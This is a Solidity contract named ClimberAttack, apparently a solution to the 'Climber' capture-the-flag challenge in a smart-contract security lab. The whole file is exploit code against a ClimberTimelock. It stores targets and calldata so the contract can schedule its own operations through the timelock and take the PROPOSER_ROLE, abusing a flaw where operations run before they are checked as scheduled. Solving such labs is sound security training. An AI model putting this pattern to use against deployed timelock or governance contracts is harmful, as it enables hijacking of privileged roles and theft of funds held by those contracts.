//SPDX-License-Identifier:MIT

pragma solidity ^0.8.0;
import "./ClimberTimelock.sol";
import {PROPOSER_ROLE} from "./ClimberConstants.sol";
import "solady/src/utils/SafeTransferLib.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract ClimberAttack {
    ClimberTimelock public lock;
    address[] public targets;
    uint256[] public values;
    bytes[] public dataElements;
    bytes32 public salt;
    bool public hasRole;

    constructor(
        address payable _timeLock,
        uint256[] memory _values,
        bytes32 _salt
    ) {
        lock = ClimberTimelock(_timeLock);
        targets.push(_timeLock);
        targets.push(_timeLock);
        targets.push(address(this));
        values = _values;
        salt = _salt;
    }

    function addData(bytes[] memory _data) public {
        dataElements = _data;
    }

    function hackSchedule() public {
        lock.schedule(targets, values, dataElements, salt);
    }

    function checkRole() public {
        hasRole = lock.hasRole(PROPOSER_ROLE, address(this));
    }

    function schedule(
        address[] calldata _targets,
        uint256[] calldata _values,
        bytes[] calldata _dataElements,
        bytes32 _salt
    ) public {
        lock.schedule(_targets, _values, _dataElements, _salt);
    }
}
